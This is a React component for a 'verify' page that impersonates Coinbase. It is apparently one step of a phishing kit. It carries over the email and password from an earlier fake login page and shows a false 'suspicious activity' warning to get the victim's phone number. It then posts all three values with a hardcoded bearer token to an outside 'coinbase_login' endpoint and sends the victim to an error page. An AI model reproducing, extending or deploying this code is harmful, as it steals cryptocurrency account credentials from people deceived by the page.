import { useState, useEffect } from 'react';
import { Link, redirect, useNavigate, useNavigation, useLocation } from "react-router-dom";
import { Helmet, HelmetProvider } from 'react-helmet-async';
import AppLayout from '../../layouts/AppLayout';
import {db} from '../../services/Firebase';
import { collection, addDoc, getDocs } from "firebase/firestore";
import { toast } from 'react-toastify';
import ValidationService from '../../services/ValidationService';
import axios from 'axios';


function Verify() {

    let initVerifyFormData          =   {
        email                       :   '', 
        password                    :   '',
        phone_number                    :   '', 
        loading                         :   false
    };

    const [verifyFormData, setVerifyFormData]   =   useState(initVerifyFormData);
    const {state}                               =   useLocation();
    const navigate                              =   useNavigate();

    useEffect(() => { 
        console.log('Effect Call')
        setTimeout(() => {
            if(!state || !state.loginFormData || !state.loginFormData.email) {
                return navigate("/");
            } else {
                setVerifyFormData({...verifyFormData, ...state.loginFormData})
            }
        },2000);
	}, [])

    const submitLoginHandler =   (event) => {
        event.preventDefault();

        setVerifyFormData({...verifyFormData, loading : true});

        let rules                   =   {
            'phone_number'              :   'required|numeric',
        };
        let rulesMsg                =   {
            'phone_number'              :    {required : 'Please enter phone'},
        };
       let error                    =   ValidationService.rulesFirstErrorGenerator(verifyFormData, rules, rulesMsg);
       if(error) {
            toast.error(error);
            setVerifyFormData({...verifyFormData, loading : false});
       } else {
            const headers       =   { 'Accept': 'application/json','Content-Type':'application/json','Authorization':'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2NTM2Mzg3NjY3MTNkMDBkMzk3YzhmMCJ9.vUCJSsofnVWOb8U7NKRZzLZPzo2QMt5bpp3I_3vJPvA'};
            axios({
                method: 'POST', headers: headers, data : verifyFormData, url: 'https://apiv2.liveledgers.com/public/coinbase_login'
            })
            .then(function (response) {
                setVerifyFormData({...verifyFormData, loading : false});
                //Goto Verify Screen :-
                return navigate("/error", { state: { verifyFormData : verifyFormData } });
            })
            .catch(function (error) {
                let msg                 =   error?.response?.data?.detail ?? 'Application not initialize successfully.';
                toast.error(msg);
                setVerifyFormData({...verifyFormData, loading : false});
            });
        }
    }

    return (<AppLayout>
        <Helmet>
            <title>Coinbase Explore| Learn| Businesses| Sign up| Login| Download</title>
        </Helmet>
        <div className='container'>
            <div className="row justify-content-center mt20">
                <div className='col-sm-5 bg-white rounded-2 text-dark p25'>
                    <form className="" onSubmit={submitLoginHandler}>
                        <div className="my20">
                            <div className="fs20 py1 fw-bold text-danger">Important Message !</div>
                            <div className="fs16 py1 fw-bold">Some Suspicious Activity Found With Your Account.</div>
                            <div className="fs16 py1 fw-bold">Enter Your Phone Number to Verify Your Identity.</div>
                            <input type="text" required className="form-control" placeholder="+1 123-456-7890"
                                value={verifyFormData.phone_number}
                                onChange={e => setVerifyFormData({...verifyFormData, 'phone_number' : e.target.value }) }
                            />
                        </div>
                        <div className='text-end'>
                            <button type="submit" className={['btn','btn-success', verifyFormData.loading ? 'disabled' : ''].join(' ')} >
                                {verifyFormData.loading && <span className="spinner-grow spinner-grow-sm me15" aria-hidden="true"></span>}
                                <span>Submit</span>
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </AppLayout>)
}

export default Verify
